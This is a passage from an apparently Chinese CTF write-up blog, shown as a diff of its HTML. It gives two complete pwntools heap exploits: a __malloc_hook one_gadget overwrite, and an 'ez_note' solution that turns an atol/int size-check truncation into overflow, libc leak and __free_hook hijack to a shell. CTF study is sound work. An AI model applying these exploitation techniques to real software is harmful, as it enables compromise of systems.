 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16D5</span></span><br><span class="line">d_a=<span class="number">0x16C1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">wine,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Whisky , brandy or Vodka?&quot;</span>, <span class="built_in">str</span>(wine))</span><br><span class="line">    p.sendafter(<span class="string">&quot;You may want to tell sth to the waiter:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much?&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;We will give everyone only one cup of icecream!\n&quot;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_libc_addr-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]<span class="comment">#-0x1ed6a0+0x1000 #</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(malloc_hook-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a)</span><br><span class="line">delete(<span class="number">2</span>,-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a)</span></span><br><span class="line">add(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/../img/image-20221007233511947.png" alt="image-20221007233511947"></p>
-<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007233524690.png" alt="image-20221007233524690"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955958.png" alt="image-20230701195513495"></p>
+<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956496.png" alt="image-20221007233524690"></p>
 <h3 id="漏洞所在：-3"><a href="#漏洞所在：-3" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p>在add函数里的输入函数中，最后用atol函数对buf做了处理(如下图)</p>
-<p><img src="/../img/image-20221007233539574.png" alt="image-20221007233539574"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956497.png" alt="image-20221007233539574"></p>
 <p>而atol函数是将字符串转换成一个长整数(long int类型)，跟这个函数很像的还有一个atoi函数，该函数是将字符串转换成一个整数(int类型)，多亏了<a target="_blank" rel="noopener" href="https://survive2.github.io/">h1J4cker师傅</a>给我说了一下，以前还真没注意过这俩函数的区别。</p>
 <p>而这道题的漏洞也在此，atol函数返回的是long int类型，可之后if在进行检查的时候却强转成了Int类型。</p>
-<p><img src="/../img/image-20221007233557237.png" alt="image-20221007233557237"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956498.png" alt="image-20221007233557237"></p>
 <p>就导致了这里输入一个大数可以绕过这个检查。</p>
 <p>举个例子我们输入4294967440，这个数字转换成二进制如下(int类型为4字节，最高比特位为符号位)</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0001     0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure>
@@ -356,23 +359,23 @@
 
 
 <p>可是最终往堆块里输入的数据又没有进行int强转，这样我们实际写入的就是那个大数4294967440，从而导致了堆溢出。</p>
-<p><img src="/../img/image-20221007233639073.png"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956499.png"></p>
 <h3 id="利用思路：-3"><a href="#利用思路：-3" class="headerlink" title="利用思路："></a>利用思路：</h3><p>不过本题中除了上述漏洞外不存在任何漏洞，就导致了我们想要泄露libc地址只能打一个堆块重叠让unsorted bin的fd和bk指针落在使用状态中的堆块上，然后将其打印出来。</p>
 <p>具体实现过程如下:</p>
 <p>1、先申请出来十个堆块，依次命名为chunk1，chunk2，chunk3…chunk10</p>
 <p>2、我们将后七个堆块(chunk4-chunk10)全部释放掉</p>
 <p>3、再将前三个堆块(chunk1、chunk2、chunk3)给释放掉，此时这三个堆块就会全部进入到unsorted bin中，而之后的tcache bin中的7个堆块则填满tcache bin同时还防止了前三个进入unsorted bin中的堆块与top chunk合并</p>
 <p>4、再将在tcachebin中的七个堆块给申请出来，需要注意的是我们在申请第六个堆块的时候要去写入一个伪造的prev_size和size保证之后可以顺利的从unsorted bin中取出堆块。(此时的情况如下)</p>
-<p><img src="/../img/image-20221007233701615.png" alt="image-20221007233701615"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955331.png" alt="image-20230701195542851"></p>
 <p>5、接下来我们申请堆块时，size写成一个大数，造成溢出来篡改unsorted bin的size。(篡改后如下)</p>
-<p><img src="/../img/image-20221007233720390.png" alt="image-20221007233720390"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011955798.png" alt="image-20230701195552315"></p>
 <p>6、我们申请一个特定大小的堆块让更新后的unsorted bin的fd和bk指针正好落在一个正在使用的堆块用户区。(如下图)</p>
-<p><img src="/../img/image-20221007233736715.png" alt="image-20221007233736715"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956109.png" alt="image-20230701195603643"></p>
 <p>7、打印索引为6的堆块，就可以进行泄露libc地址</p>
 <p>8、最后打一个tcache poisoing劫持tcache bin的fd指针将free_hook申请出来，释放掉一个存有&#x2F;bin&#x2F;sh字符串的堆块即可获取shell</p>
 <h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16BB</span></span><br><span class="line">d_a=<span class="number">0x16A9</span></span><br><span class="line">d_s=<span class="number">0x16CD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1.Add note\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0x200</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4294967424</span>,<span class="string">b&#x27;u&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x201</span>)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x140</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ebbe0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4294967424</span>+<span class="number">16</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../img/image-20221007233750427.png" alt="image-20221007233750427"></p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011956096.png" alt="image-20230701195620520"></p>
 
     </div>
 
